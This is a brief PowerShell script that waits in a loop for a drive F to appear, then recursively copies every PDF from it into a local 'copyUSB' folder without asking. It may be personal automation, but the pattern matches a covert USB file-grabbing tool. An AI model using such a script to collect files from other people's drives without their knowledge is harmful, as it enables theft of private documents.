$i = 0
while($i -ne 1){
if(((Get-Partition).DriveLetter | select-string F) -notlike ""){
Write-Host "Detectado"
ls F:/ *pdf -Recurse | % {Copy-Item -Path $_.FullName -Destination C:\Users\ArticDirex\Documents\copyUSB}
$i++
}
}